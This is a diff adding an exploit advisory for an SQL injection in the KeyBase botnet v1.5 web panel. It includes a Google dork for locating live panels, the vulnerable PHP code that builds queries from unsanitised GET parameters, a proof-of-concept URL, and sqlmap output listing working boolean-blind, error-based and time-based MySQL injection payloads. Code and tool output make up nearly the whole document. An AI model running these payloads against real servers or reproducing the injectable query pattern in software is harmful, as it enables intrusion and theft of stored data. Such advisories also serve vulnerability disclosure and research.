@@ -1,0 +1,50 @@
+################################
+# Exploit Title: KeyBase Botnet v1.5 - SQL Injection Vulnerability
+# Google Dork: intitle:"KeyBase: Login" + intext:"( Login to get access to your logs )"
+# Date: 3/12/2018
+# Exploit Author: n4pst3r
+# Vendor Homepage: unkn0wn
+# Software Link: unkn0wn
+# Version: v1.5
+# Tested on: Windows 10, debian 7
+# CVE : n/a
+################################
+# Vuln-Code: post.php - variant "keystrokes, passwords, clipboard" & "machinename, machinetime"
+if ($_GET['type'] == 'keystrokes')
+{
+$sqlk = "CREATE TABLE if not exists Keystrokes (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, machinename VARCHAR(255) NOT NULL, windowtitle VARCHAR(255) NOT NULL,
+keystrokestyped VARCHAR(255), machinetime VARCHAR(255) NOT NULL, ipaddress VARCHAR(255) NOT NULL, date TIMESTAMP)";
+
+if ($conn->query($sqlk) === TRUE) {
+    $sqlinsertk ="INSERT INTO Keystrokes (id, machinename, windowtitle, keystrokestyped, machinetime, ipaddress, date) VALUES (NULL, '$machinename', '$windowtitle', '$keystrokestyped', '$machinetime', '$ipaddress', '$date')"; 
+
+    if ($conn->query($sqlinsertk) === TRUE) {
+       echo "<br>Success";
+}else{
+echo "<br>Error:" . $conn->error;
+} } else {
+    echo "<br>Error:" . $conn->error;
+}
+################################
+PoC:
+
+http://127.0.0.1/post.php?type=keystrokes&machinename=[SQLi]1&machinetime=[SQLi]
+
+################################
+Response: 
+
+GET parameter 'machinename' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 410 HTTP(s) requests:
+---
+Parameter: machinename (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: type=keystrokes&machinename=1' RLIKE (SELECT (CASE WHEN (6432=6432) THEN 1 ELSE 0x28 END)) AND 'CbAF'='CbAF&machinetime=1
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: type=keystrokes&machinename=1' AND (SELECT 9909 FROM(SELECT COUNT(*),CONCAT(0x717a7a6b71,(SELECT (ELT(9909=9909,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gwid'='gwid&machinetime=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: type=keystrokes&machinename=1' AND SLEEP(5) AND 'MWry'='MWry&machinetime=1
